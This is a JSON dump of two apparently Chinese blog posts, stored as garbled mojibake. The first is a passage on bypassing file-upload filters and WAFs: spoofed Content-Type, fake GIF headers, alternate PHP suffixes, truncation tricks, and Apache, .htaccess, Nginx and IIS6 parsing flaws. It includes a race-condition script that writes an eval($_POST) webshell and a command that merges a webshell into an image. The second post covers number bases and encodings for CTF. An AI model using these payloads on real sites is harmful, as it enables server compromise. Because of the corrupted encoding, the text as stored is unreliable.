é€šè¿‡burpsuiteæ¥ä¿®æ”¹æ–‡ä»¶çš„ç±»å‹(Content-Type)è¿›è¡Œè¿‡æ»¤å³å¯ æ–‡ä»¶å†…å®¹å¤´æ£€æµ‹é€šè¿‡æ£€æµ‹æ–‡ä»¶å¤´å†…å®¹åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶çš„åˆæ³•æ€§ ç»•è¿‡æ–¹æ³•ï¼š åœ¨æ¶æ„è„šæœ¬å‰åŠ ä¸Šå…è®¸ä¸Šä¼ æ–‡ä»¶çš„å¤´æ ‡è¯†(æ¯”å¦‚GIF89aï¼Œä¼šè§£ææˆgifæ–‡ä»¶) é»‘åå•ä¸ç™½åå•é€šè¿‡åˆ¤æ–­åç¼€åæ¥ç¡®å®šä¸Šä¼ æ–‡ä»¶çš„åˆæ³•æ€§ é»‘åå•ç»•è¿‡æ–¹æ³•ï¼š å¤§å°å†™ç»•è¿‡ï¼Œä¾‹å¦‚Phpã€PhP åˆ©ç”¨é»‘åå•ä¸­æ²¡æœ‰çš„ï¼Œä½†æ˜¯åˆèƒ½å¤Ÿè¢«è§£æçš„åç¼€åï¼Œä¾‹å¦‚phpã€ php3ã€ php4ã€php5ã€php7ã€phtã€phtmlã€phps é…åˆè§£æåˆ©ç”¨æ–¹æ³•ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶å½“ä½œphpä»£ç æ‰§è¡Œ ä½¿ç”¨00æˆªæ–­(åŸºäºä¸€ä¸ªç»„åˆé€»è¾‘æ¼æ´é€ æˆçš„ï¼Œé€šå¸¸å­˜åœ¨äºæ„é€ ä¸Šä¼ æ–‡ä»¶è·¯å¾„çš„æ—¶å€™) è¶…é•¿æ–‡ä»¶åæˆªæ–­ä¸Šä¼ (windows 258byte | linux 4096byte)ç™½åå•ç»•è¿‡æ–¹æ³•ä¸å¤ªå¥½ç»•è¿‡ï¼Œä¸€èˆ¬éƒ½æ˜¯é…åˆè§£ææ¼æ´ wafç»•è¿‡å§¿åŠ¿ç«äº‰ä¸Šä¼ æƒ…æ™¯ï¼š æ–‡ä»¶ä¸Šä¼ åï¼Œæ£€æµ‹æ˜¯å¦åˆæ³•ï¼Œä¸åˆæ³•å°±åˆ é™¤ åˆ©ç”¨æ–¹å¼ï¼š åœ¨åˆ é™¤å‰è®¿é—®åˆ°ä¸Šä¼ çš„æ–‡ä»¶ &lt;?php $file = &#39;web.php&#39;; $shell = &#39;&lt;?php eval($_POST[&quot;key&quot;])?&gt;&#39;; file_put_contents($file,$shell); ?&gt; ç”¨bpåŒæ—¶ä¸Šä¼ å’Œè®¿é—®ï¼Œè™½ç„¶ä¸Šä¼ çš„æ–‡ä»¶è¢«åˆ é™¤äº†ï¼Œä½†å¯ä»¥é€šè¿‡è®¿é—®web.php åŒæ–‡ä»¶ä¸Šä¼ åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œå³é”®å®¡æŸ¥å…ƒç´ ï¼Œé¦–å…ˆä¿®æ”¹actionä¸ºå®Œæ•´è·¯å¾„ï¼Œç„¶åå¤åˆ¶ç²˜è´´ä¸Šä¼ æµè§ˆæ–‡ä»¶ï¼ˆ&lt;input â€¦â€¦ï¼‰ï¼Œè¿™æ ·å°±ä¼šå‡ºç°ä¸¤ä¸ªä¸Šä¼ æ¡†ï¼Œç¬¬ä¸€ä¸ªä¸Šä¼ æ­£å¸¸æ–‡ä»¶ï¼Œç¬¬äºŒä¸ªé€‰æ‹©ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åæäº¤ã€‚ åƒåœ¾æ•°æ®æœ‰äº›ä¸»æœºWAFè½¯ä»¶ä¸ºäº†ä¸å½±å“webæœåŠ¡å™¨çš„æ€§èƒ½ï¼Œä¼šå¯¹æ ¡éªŒçš„ç”¨æˆ·æ•°æ®è®¾ç½®å¤§å°ä¸Šé™ï¼Œæ¯”å¦‚1Mã€‚æ­¤ç§æƒ…å†µå¯ä»¥æ„é€ ä¸€ä¸ªå¤§æ–‡ä»¶ï¼Œå‰é¢1Mçš„å†…å®¹ä¸ºåƒåœ¾å†…å®¹ï¼Œåé¢æ‰æ˜¯çœŸæ­£çš„æœ¨é©¬å†…å®¹ï¼Œä¾¿å¯ä»¥ç»•è¿‡WAFå¯¹æ–‡ä»¶å†…å®¹çš„æ ¡éªŒï¼› å½“ç„¶ä¹Ÿå¯ä»¥å°†åƒåœ¾æ•°æ®æ”¾åœ¨æ•°æ®åŒ…æœ€å¼€å¤´ï¼Œè¿™æ ·ä¾¿å¯ä»¥ç»•è¿‡å¯¹æ–‡ä»¶åçš„æ ¡éªŒã€‚ filenameé’ˆå¯¹æ—©æœŸç‰ˆæœ¬å®‰å…¨ç‹—ï¼Œå¯ä»¥å¤šåŠ ä¸€ä¸ªfilename æˆ–è€…å°†filenameæ¢ä½ç½®ï¼Œåœ¨IIS6.0ä¸‹å¦‚æœæˆ‘ä»¬æ¢ä¸€ç§ä¹¦å†™æ–¹å¼ï¼ŒæŠŠfilenameæ”¾åœ¨å…¶ä»–åœ°æ–¹ï¼š POST/GETæœ‰äº›WAFçš„è§„åˆ™æ˜¯ï¼šå¦‚æœæ•°æ®åŒ…ä¸ºPOSTç±»å‹ï¼Œåˆ™æ ¡éªŒæ•°æ®åŒ…å†…å®¹ã€‚æ­¤ç§æƒ…å†µå¯ä»¥ä¸Šä¼ ä¸€ä¸ªPOSTå‹çš„æ•°æ®åŒ…ï¼ŒæŠ“åŒ…å°†POSTæ”¹ä¸ºGETã€‚ æ–‡ä»¶é‡å‘½åç»•è¿‡å¦‚æœwebç¨‹åºä¼šå°†filenameé™¤äº†æ‰©å±•åçš„é‚£æ®µé‡å‘½åçš„è¯ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥æ„é€ æ›´å¤šçš„ç‚¹ã€ç¬¦å·ç­‰ç­‰ã€‚ ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡æ–‡ä»¶åä½¿ç”¨éå­—æ¯æ•°å­—ï¼Œæ¯”å¦‚ä¸­æ–‡ç­‰æœ€å¤§ç¨‹åº¦çš„æ‹‰é•¿ï¼Œä¸è¡Œçš„è¯å†ç»“åˆä¸€ä¸‹å…¶ä»–çš„ç‰¹æ€§è¿›è¡Œæµ‹è¯•ï¼š shell.asp;ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹.jpg å›¾ç‰‡é©¬å°†å›¾ç‰‡å’Œä¸€å¥è¯åœ¨cmdä¸‹åˆæˆåï¼Œä»¥phpè„šæœ¬æ‰§è¡Œæ—¶åˆæˆçš„ä¸€å¥è¯ä¹Ÿä¼šè¢«æ‰§è¡Œ å½“ä¸€å¥è¯è¢«æ‰§è¡Œæ—¶ï¼Œæµè§ˆå™¨è®¿é—®æ—¶çœ‹ä¸åˆ°ä¸€å¥è¯ä»£ç  åˆ¶ä½œåœ¨cmdä¸­è¾“å…¥ copy a.jpg/b+a.php shell.jpg åˆ©ç”¨ é…åˆæ–‡ä»¶åŒ…å«æ¼æ´ é…åˆç½‘ç«™å®¹å™¨è§£ææ¼æ´ å¸¸è§ç½‘ç«™å®¹å™¨è§£ææ¼æ´Apacheå¤šåç¼€åApacheå¯¹äºæ–‡ä»¶åçš„è§£ææ˜¯ä»åå¾€å‰è§£æçš„ï¼Œç›´åˆ°é‡è§ä¸€ä¸ªApacheè®¤è¯†çš„æ–‡ä»¶ç±»å‹ä¸ºæ­¢ å¦‚ï¼š hello.php.rar.rar.rar Apacheä¸è®¤è¯†.rarè¿™ä¸ªæ–‡ä»¶ç±»å‹ï¼Œä¼šä¸€ç›´éå†åˆ°.php åœ¨phpstudyç½‘ç«™ç›®å½•å­˜æ”¾ä¸€å¼ a.jpgå›¾ç‰‡ï¼Œå°†å…¶æ”¹åä¸ºa.jpg.abcï¼Œå†ç”¨æµè§ˆå™¨å»è®¿é—®è¿™å¼ å›¾ç‰‡ï¼Œå‘ç°è¢«æˆåŠŸè§£æä¸ºå›¾ç‰‡ï¼š é‚£ä¹ˆç°åœ¨åœ¨ç½‘ç«™ç›®å½•å­˜æ”¾ä¸€ä¸ªma.phpæ–‡ä»¶ï¼Œé‡Œé¢å†…å®¹ä¸ºï¼š 123&lt;?phpecho &#39;good&#39;;?&gt; å†å°†å…¶æ”¹åä¸ºma.php.abcï¼Œè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼š å‘ç°å…¶å¹¶æ²¡æœ‰è¢«è§£æï¼Œè€Œæ˜¯ç›´æ¥å°†é‡Œé¢çš„å†…å®¹æ˜¾ç¤ºäº†å‡ºæ¥ï¼Œè¿™æ˜¯å› ä¸ºApacheæœ¬èº«å¹¶ä¸æ‡‚phpï¼Œè€Œæ˜¯å°†è¿™ä¸ªæ–‡ä»¶äº¤ç»™phpè§£é‡Šå™¨ï¼Œphpè§£é‡Šå™¨å’ŒApacheæœ‰ç€ä¸åŒçš„è§£æè§„åˆ™ï¼› åœ¨phpStudy\\PHPTutorial\\Apache\\conf\\extraæ‰¾åˆ°httpd-php.confè¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ‰“å¼€å¯ä»¥çœ‹åˆ° 123&lt;FilesMatch &quot;\\.php$&quot;&gt; SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåªæœ‰å½“æ–‡ä»¶ååç¼€ä¸º.phpæ—¶ï¼Œæ–‡ä»¶æ‰èƒ½è¢«å½“åšphpæ‰§è¡Œï¼Œé‚£ä¹ˆç°åœ¨å°†å…¶æ”¹ä¸ºï¼š 123&lt;FilesMatch &quot;\\.php\\.&quot;&gt; SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; é‡å¯phpstudyï¼Œå¯ä»¥çœ‹åˆ°ma.php.abcå·²ç»å¯ä»¥è¢«è§£æäº†ï¼š ç½•è§åç¼€åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸åªæ˜¯phpï¼Œå°±è¿phtmlã€phtã€php3ã€php4å’Œphp5éƒ½æ˜¯Apacheå’Œphpè®¤å¯çš„phpç¨‹åºçš„æ–‡ä»¶åç¼€ å¦™ç”¨.HTACCESSApacheæä¾›äº†ä¸€ç§å¾ˆæ–¹ä¾¿çš„ã€å¯ä½œç”¨äºå½“å‰ç›®å½•åŠå…¶å­ç›®å½•çš„åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼š.htaccess è¦ä½¿.htaccessæ–‡ä»¶ç”Ÿæ•ˆï¼Œéœ€è¦åœ¨Apacheçš„é…ç½®æ–‡ä»¶ä¸­å†™ä¸Š(è¿™é‡Œæˆ‘çš„é…ç½®æ–‡ä»¶ä¸­é»˜è®¤å°±æœ‰ä»¥ä¸‹é…ç½®)ï¼š AllowOverride All LoadModule rewrite_module modules/mod_rewrite.so ä¹‹åï¼Œæˆ‘ä»¬æµ‹è¯•ç”¨.htaccessæ–‡ä»¶ä¿®æ”¹phpè§£é‡Šå™¨é…ç½®ï¼š æ–°å»ºä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œç”±äºwindowsä¸æ”¯æŒæ–‡ä»¶åä»¥å°æ•°ç‚¹å¼€å¤´ï¼Œéœ€è¦ç”¨åˆ°cmdå‘½ä»¤ï¼š echo &gt; .htaccess è¿™æ ·å³å¯ç”Ÿæˆ.htaccessæ–‡ä»¶ï¼›åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢å†™å…¥ï¼š 123&lt;FilesMatch &quot;xxx&quot;&gt; SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FilesMatch&gt; å³è®©phpè§£é‡Šå™¨å°†æ–‡ä»¶åä¸­å«æœ‰xxxçš„æ–‡ä»¶è§£æä¸ºphp åœ¨æ­¤.htaccessç›®å½•åˆ›å»ºa.xxxæ–‡ä»¶ï¼Œåœ¨é‡Œé¢å†™å…¥ï¼š &lt;?php echo &#39;good&#39;; ?&gt; å‘ç°å…¶è¢«è§£ææˆäº†phpï¼š Ngnix Nginxç‰ˆæœ¬ï¼š 1234Nginx 0.5.*Nginx 0.6.*Nginx 0.7 &lt;&#x3D; 0.7.65Nginx 0.8 &lt;&#x3D; 0.8.37 ä»¥ä¸ŠNginxå®¹å™¨çš„ç‰ˆæœ¬ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªåœ¨wafç™½åå•ä¹‹å†…æ‰©å±•åçš„æ–‡ä»¶shell.jpgï¼Œç„¶åä»¥shell.jpg.phpè¿›è¡Œè¯·æ±‚ Nginxç‰ˆæœ¬ï¼š 1Nginx 0.8.41 â€“ 1.5.6ï¼š ä»¥ä¸ŠNginxå®¹å™¨çš„ç‰ˆæœ¬ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªåœ¨wafç™½åå•ä¹‹å†…æ‰©å±•åçš„æ–‡ä»¶shell.jpgï¼Œç„¶åä»¥shell.jpg%20.phpè¿›è¡Œè¯·æ±‚ IIS6.0IIS6.0å±äºwinserverä¸‹çš„æœåŠ¡å™¨ aspå³ active server pagesï¼Œæ˜¯microsoftå…¬å¸å¼€å‘çš„æœåŠ¡ç«¯è„šæœ¬ç¯å¢ƒï¼Œå¯ç”¨æ¥åˆ›å»ºåŠ¨æ€äº¤äº’å¼ç½‘é¡µå¹¶å»ºç«‹å¼ºå¤§çš„webåº”ç”¨ç¨‹åº ç›®å½•ååŒ…å«.aspã€.asaã€.cerçš„è¯ï¼Œåˆ™è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½å°†æŒ‰ç…§aspè§£æ æ–‡ä»¶åä¸­å¦‚æœåŒ…å«.asp;ã€.asa;ã€.cer;åˆ™ä¼˜å…ˆä½¿ç”¨aspè§£æï¼Œå¦‚asa.asa;asa.jpg å‚è€ƒï¼š https://thief.one/2016/09/22/ä¸Šä¼ æœ¨é©¬å§¿åŠ¿æ±‡æ€»-æ¬¢è¿è¡¥å……/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"http://www.m00nback.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"è¿›åˆ¶ä¸ç¼–ç ","slug":"binary-coding","date":"2019-08-16T09:46:24.000Z","updated":"2019-10-17T05:52:54.140Z","comments":true,"path":"2019/08/16/binary-coding/","link":"","permalink":"http://www.m00nback.xyz/2019/08/16/binary-coding/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†CTFä¸­ä¸€äº›å¸¸è§çš„è¿›åˆ¶å’Œç¼–ç æ–¹å¼ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†CTFä¸­ä¸€äº›å¸¸è§çš„è¿›åˆ¶å’Œç¼–ç æ–¹å¼ï¼ äºŒè¿›åˆ¶äºŒè¿›åˆ¶æ•°æ®æ˜¯ç”¨0å’Œ1ä¸¤ä¸ªæ•°ç æ¥è¡¨ç¤ºçš„æ•°ï¼Œå½“å‰çš„è®¡ç®—æœºç³»ç»Ÿä½¿ç”¨çš„åŸºæœ¬ä¸Šæ˜¯äºŒè¿›åˆ¶ç³»ç»Ÿã€‚ äºŒè¿›åˆ¶ï¼ˆç®€ç§°Bin)ä¸ºä»€ä¹ˆç”¨å…«ä½æ¥è¡¨ç¤ºï¼Ÿ å…«ä½ï¼ˆ8bitï¼‰æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œè®¡ç®—æœºä¸­åªè¦ä¸€ä¸ªå­—èŠ‚å°±å¯ä»¥å­˜æ”¾ASCIIç¼–ç ï¼Œå°±æ˜¯æ‰€æœ‰çš„æ•°å­—ã€å¤§å°å†™å­—æ¯å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼ˆæ€»å…±255ä¸ªï¼‰ã€‚æ‰€ä»¥åœ¨è®¡ç®—æœºä¸­å¯¹ç”¨æˆ·æ¥è¯´æœ‰æ„ä¹‰çš„å•ä½å°±æ˜¯å­—èŠ‚ï¼Œè¿™æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹æ‡‚çš„ã€‚å…«ä½çš„äºŒè¿›åˆ¶æ•°æœ€å¤§å€¼å°±æ˜¯255ï¼Œåˆšå¥½è¡¨ç¤º255ä¸ªASCIIå­—ç¬¦ å…«è¿›åˆ¶å…«è¿›åˆ¶ï¼ŒOctalï¼Œç¼©å†™OCTæˆ–Oï¼Œä¸€ç§ä»¥8ä¸ºåŸºæ•°çš„è®¡æ•°æ³•ï¼Œé‡‡ç”¨0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œ7å…«ä¸ªæ•°å­—ï¼Œé€¢å…«è¿›1ã€‚ä¸€äº›ç¼–ç¨‹è¯­è¨€ä¸­å¸¸å¸¸ä»¥æ•°å­—0å¼€å§‹è¡¨æ˜è¯¥æ•°å­—æ˜¯å…«è¿›åˆ¶ã€‚å…«è¿›åˆ¶çš„æ•°å’ŒäºŒè¿›åˆ¶æ•°å¯ä»¥æŒ‰ä½å¯¹åº”ï¼ˆå…«è¿›åˆ¶ä¸€ä½å¯¹åº”äºŒè¿›åˆ¶ä¸‰ä½ï¼‰ï¼Œå› æ­¤å¸¸åº”ç”¨åœ¨è®¡ç®—æœºè¯­è¨€ä¸­ã€‚ åå…­è¿›åˆ¶åå…­è¿›åˆ¶ï¼ˆç®€å†™ä¸ºhexæˆ–ä¸‹æ ‡16ï¼‰åœ¨æ•°å­¦ä¸­æ˜¯ä¸€ç§é€¢16è¿›1çš„è¿›ä½åˆ¶ã€‚ä¸€èˆ¬ç”¨æ•°å­—0åˆ°9å’Œå­—æ¯Aåˆ°Fï¼ˆæˆ–afï¼‰è¡¨ç¤ºï¼Œå…¶ä¸­:AFè¡¨ç¤º10~15ï¼Œè¿™äº›ç§°ä½œåå…­è¿›åˆ¶æ•°å­—ã€‚ ä¸€èˆ¬ä»¥0xå¼€å¤´çš„éƒ½æ˜¯åå…­è¿›åˆ¶å½¢å¼ï¼Œä¸”æ˜¯ä¸¤ä½æ¥è¡¨ç¤ºï¼Œ16x16=2^8,åˆšå¥½å’ŒäºŒè¿›åˆ¶å¯¹åº” ASCIIç¼–ç ASCII ((American Standard Code for Information Interchange): ç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç ï¼‰æ˜¯åŸºäºæ‹‰ä¸å­—æ¯çš„ä¸€å¥—ç”µè„‘ç¼–ç ç³»ç»Ÿï¼Œä¸»è¦ç”¨äºæ˜¾ç¤ºç°ä»£è‹±è¯­å’Œå…¶ä»–è¥¿æ¬§è¯­è¨€ã€‚å®ƒæ˜¯æœ€é€šç”¨çš„ä¿¡æ¯äº¤æ¢æ ‡å‡†ï¼Œå¹¶ç­‰åŒäºå›½é™…æ ‡å‡†ISO/IEC 646ã€‚ ç¬¬0ï½32å·åŠç¬¬127å·(å…±34ä¸ª)æ˜¯æ§åˆ¶å­—ç¬¦æˆ–é€šè®¯ä¸“ç”¨å­—ç¬¦ï¼Œå¦‚æ§åˆ¶ç¬¦ï¼šLFï¼ˆæ¢è¡Œï¼‰ã€CRï¼ˆå›è½¦ï¼‰ã€FFï¼ˆæ¢é¡µï¼‰ã€DELï¼ˆåˆ é™¤ï¼‰ã€BELï¼ˆæŒ¯é“ƒï¼‰ç­‰ï¼›é€šè®¯ä¸“ç”¨å­—ç¬¦ï¼šSOHï¼ˆæ–‡å¤´ï¼‰ã€EOTï¼ˆæ–‡å°¾ï¼‰ã€ACKï¼ˆç¡®è®¤ï¼‰ç­‰ï¼› ç¬¬33ï½126å·(å…±94ä¸ª)æ˜¯å­—ç¬¦ï¼Œå…¶ä¸­ç¬¬48ï½57å·ä¸º0ï½9åä¸ªé˜¿æ‹‰ä¼¯æ•°å­—ï¼›65ï½90å·ä¸º26ä¸ªå¤§å†™è‹±æ–‡å­—æ¯ï¼Œ97ï½122å·ä¸º26ä¸ªå°å†™è‹±æ–‡å­—æ¯ï¼Œå…¶ä½™ä¸ºä¸€äº›æ ‡ç‚¹ç¬¦å·ã€è¿ç®—ç¬¦å·ç­‰ã€‚ ç¤ºä¾‹æºæ–‡æœ¬ï¼šThe quick brown fox jumps over the lazy dog ASCIIç¼–ç å¯¹åº”åè¿›åˆ¶ï¼š 84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103 Unicodeç¼–ç å†å²é—®é¢˜è‹±è¯­ç”¨ 128 ä¸ªå­—ç¬¦æ¥ç¼–ç å®Œå…¨æ˜¯è¶³å¤Ÿçš„ï¼Œä½†æ˜¯ç”¨æ¥è¡¨ç¤ºå…¶ä»–è¯­è¨€ï¼Œ128 ä¸ªå­—ç¬¦æ˜¯è¿œè¿œä¸å¤Ÿçš„ã€‚äºæ˜¯ï¼Œä¸€äº›æ¬§æ´²çš„å›½å®¶å°±å†³å®šï¼Œå°† ASCII ç ä¸­é—²ç½®çš„æœ€é«˜ä½åˆ©ç”¨èµ·æ¥ï¼Œè¿™æ ·ä¸€æ¥å°±èƒ½è¡¨ç¤º 256 ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œè¿™é‡Œåˆæœ‰äº†ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ä¸åŒçš„å›½å®¶çš„å­—ç¬¦é›†å¯èƒ½ä¸åŒï¼Œå°±ç®—å®ƒä»¬éƒ½èƒ½ç”¨ 256 ä¸ªå­—ç¬¦è¡¨ç¤ºå…¨ï¼Œä½†æ˜¯åŒä¸€ä¸ªç ç‚¹ï¼ˆä¹Ÿå°±æ˜¯ 8 ä½äºŒè¿›åˆ¶æ•°ï¼‰è¡¨ç¤ºçš„å­—ç¬¦å¯èƒ½å¯èƒ½ä¸åŒã€‚ä¾‹å¦‚ï¼Œ144 åœ¨é˜¿æ‹‰ä¼¯äººçš„ ASCII ç ä¸­æ˜¯ Ú¯ï¼Œè€Œåœ¨ä¿„ç½—æ–¯çš„ ASCII ç ä¸­æ˜¯ Ñ’ã€‚ å› æ­¤ï¼ŒASCII ç çš„é—®é¢˜åœ¨äºå°½ç®¡æ‰€æœ‰äººéƒ½åœ¨ 0 - 127 å·å­—ç¬¦ä¸Šè¾¾æˆäº†ä¸€è‡´ï¼Œä½†å¯¹äº 128 - 255 å·å­—ç¬¦ä¸Šå´æœ‰å¾ˆå¤šç§ä¸åŒçš„è§£é‡Šã€‚ä¸æ­¤åŒæ—¶ï¼Œäºšæ´²è¯­è¨€æœ‰æ›´å¤šçš„å­—ç¬¦éœ€è¦è¢«å­˜å‚¨ï¼Œä¸€ä¸ªå­—èŠ‚å·²ç»ä¸å¤Ÿç”¨äº†ã€‚äºæ˜¯ï¼Œäººä»¬å¼€å§‹ä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚æ¥å­˜å‚¨å­—ç¬¦ã€‚ å„ç§å„æ ·çš„ç¼–ç æ–¹å¼æˆäº†ç³»ç»Ÿå¼€å‘è€…çš„å™©æ¢¦ï¼Œå› ä¸ºä»–ä»¬æƒ³æŠŠè½¯ä»¶å–åˆ°å›½å¤–ã€‚äºæ˜¯ï¼Œä»–ä»¬æå‡ºäº†ä¸€ä¸ªâ€œå†…ç è¡¨â€çš„æ¦‚å¿µï¼Œå¯ä»¥åˆ‡æ¢åˆ°ç›¸åº”è¯­è¨€çš„ä¸€ä¸ªå†…ç è¡¨ï¼Œè¿™æ ·æ‰èƒ½æ˜¾ç¤ºç›¸åº”è¯­è¨€çš„å­—æ¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœä½¿ç”¨å¤šè¯­ç§ï¼Œé‚£ä¹ˆå°±éœ€è¦é¢‘ç¹çš„åœ¨å†…ç è¡¨å†…è¿›è¡Œåˆ‡æ¢ã€‚ Unicodeæœ€ç»ˆï¼Œç¾å›½äººæ„è¯†åˆ°ä»–ä»¬åº”è¯¥æå‡ºä¸€ç§æ ‡å‡†æ–¹æ¡ˆæ¥å±•ç¤ºä¸–ç•Œä¸Šæ‰€æœ‰è¯­è¨€ä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼Œå‡ºäºè¿™ä¸ªç›®çš„ï¼ŒUnicodeè¯ç”Ÿäº†ã€‚ Unicode å½“ç„¶æ˜¯ä¸€æœ¬å¾ˆåšçš„å­—å…¸ï¼Œè®°å½•ç€ä¸–ç•Œä¸Šæ‰€æœ‰å­—ç¬¦å¯¹åº”çš„ä¸€ä¸ªæ•°å­—ã€‚å…·ä½“æ˜¯æ€æ ·çš„å¯¹åº”å…³ç³»ï¼Œåˆæˆ–è€…è¯´æ˜¯å¦‚ä½•è¿›è¡Œåˆ’åˆ†çš„ï¼Œå°±ä¸æ˜¯æˆ‘ä»¬è€ƒè™‘çš„é—®é¢˜äº†ï¼Œæˆ‘ä»¬åªç”¨çŸ¥é“ Unicode ç»™æ‰€æœ‰çš„å­—ç¬¦æŒ‡å®šäº†ä¸€ä¸ªæ•°å­—ç”¨æ¥è¡¨ç¤ºè¯¥å­—ç¬¦ã€‚ å¯¹äº Unicode æœ‰ä¸€äº›è¯¯è§£ï¼Œå®ƒä»…ä»…åªæ˜¯ä¸€ä¸ªå­—ç¬¦é›†ï¼Œè§„å®šäº†ç¬¦åˆå¯¹åº”çš„äºŒè¿›åˆ¶ä»£ç ï¼Œè‡³äºè¿™ä¸ªäºŒè¿›åˆ¶ä»£ç å¦‚ä½•å­˜å‚¨åˆ™æ²¡æœ‰ä»»ä½•è§„å®šã€‚å®ƒçš„æƒ³æ³•å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸ºæ¯ä¸ªå­—ç¬¦è§„å®šä¸€ä¸ªç”¨æ¥è¡¨ç¤ºè¯¥å­—ç¬¦çš„æ•°å­—ï¼Œä»…æ­¤è€Œå·²ã€‚ Unicode ç¼–ç æ–¹æ¡ˆä¹‹å‰æåˆ°ï¼ŒUnicode æ²¡æœ‰è§„å®šå­—ç¬¦å¯¹åº”çš„äºŒè¿›åˆ¶ç å¦‚ä½•å­˜å‚¨ã€‚ä»¥æ±‰å­—â€œæ±‰â€ä¸ºä¾‹ï¼Œå®ƒçš„ Unicode ç ç‚¹æ˜¯ 0x6c49ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶æ•°æ˜¯ 110110001001001ï¼ŒäºŒè¿›åˆ¶æ•°æœ‰ 15 ä½ï¼Œè¿™ä¹Ÿå°±è¯´æ˜äº†å®ƒè‡³å°‘éœ€è¦ 2 ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºã€‚å¯ä»¥æƒ³è±¡ï¼Œåœ¨ Unicode å­—å…¸ä¸­å¾€åçš„å­—ç¬¦å¯èƒ½å°±éœ€è¦ 3 ä¸ªå­—èŠ‚æˆ–è€… 4 ä¸ªå­—èŠ‚ï¼Œç”šè‡³æ›´å¤šå­—èŠ‚æ¥è¡¨ç¤ºäº†ã€‚ è¿™å°±å¯¼è‡´äº†ä¸€äº›é—®é¢˜ï¼Œè®¡ç®—æœºæ€ä¹ˆçŸ¥é“ä½ è¿™ä¸ª 2 ä¸ªå­—èŠ‚è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œä¸æ˜¯åˆ†åˆ«è¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬å¯èƒ½ä¼šæƒ³åˆ°ï¼Œé‚£å°±å–ä¸ªæœ€å¤§çš„ï¼Œå‡å¦‚ Unicode ä¸­æœ€å¤§çš„å­—ç¬¦ç”¨ 4 å­—èŠ‚å°±å¯ä»¥è¡¨ç¤ºäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°†æ‰€æœ‰çš„å­—ç¬¦éƒ½ç”¨ 4 ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œä¸å¤Ÿçš„å°±å¾€å‰é¢è¡¥ 0ã€‚è¿™æ ·ç¡®å®å¯ä»¥è§£å†³ç¼–ç é—®é¢˜ï¼Œä½†æ˜¯å´é€ æˆäº†ç©ºé—´çš„æå¤§æµªè´¹ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªè‹±æ–‡æ–‡æ¡£ï¼Œé‚£æ–‡ä»¶å¤§å°å°±å¤§å‡ºäº† 3 å€ï¼Œè¿™æ˜¾ç„¶æ˜¯æ— æ³•æ¥å—çš„ã€‚ äºæ˜¯ï¼Œä¸ºäº†è¾ƒå¥½çš„è§£å†³ Unicode çš„ç¼–ç é—®é¢˜ï¼Œ UTF-8 å’Œ UTF-16 ä¸¤ç§å½“å‰æ¯”è¾ƒæµè¡Œçš„ç¼–ç æ–¹å¼è¯ç”Ÿäº†ã€‚å½“ç„¶è¿˜æœ‰ä¸€ä¸ª UTF-32 çš„ç¼–ç æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯ä¸Šè¿°é‚£ç§å®šé•¿ç¼–ç 